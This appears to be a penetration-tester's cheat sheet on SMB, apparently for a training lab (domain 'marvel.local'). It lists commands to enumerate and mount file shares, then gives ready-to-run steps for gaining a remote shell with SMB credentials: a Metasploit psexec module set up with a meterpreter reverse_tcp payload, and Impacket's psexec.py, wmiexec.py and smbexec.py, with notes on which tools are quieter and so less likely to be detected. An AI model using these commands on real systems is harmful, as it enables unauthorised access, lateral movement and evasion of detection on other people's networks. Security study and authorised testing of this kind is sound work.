### SMB
#### Enumerating and Mounting
```
# Connect to SMB share using smbclient
smbclient //MOUNT/share -I target -N

# Another way to mount shares using smbclient
smbclient \\\\<ip>\\<sharename>

# Scan smb share using smbmap
smbmap -H xx.xx.xx.xxx
# or
smbmap -H xx.xx.xx.xxx -u anonymous

# Scan smb share using smbclient
smbclient -N -L //xx.xx.xx.xxx

# Mount smb share directly to Linux
mount -t cifs //serverip/sharename /media/windowsshare

```
#### Gaining shell with SMB credentials (usually used with AD exploits)
```
# Using metasploit. (Always try 'exploit' twice!)
use exploit/windows/smb/psexec
set smbdomain marvel.local
set smbpass <password>
set smbuser <username>
set payload windows/x64/meterpreter/reverse_tcp
exploit
# If this doesn't work, attempt to change the automatic targeting.
show targets

# Using psexec.py
psexec.py marvel.local/username:password@<ip>

# Using wmiexec.py (this is quieter than psexec.py)
wmiexec.py marvel.local/username:password@<ip>

# Using smbexec.py (this is quieter than psexec.py)
smbexec.py marvel.local/username:password@<ip>
```
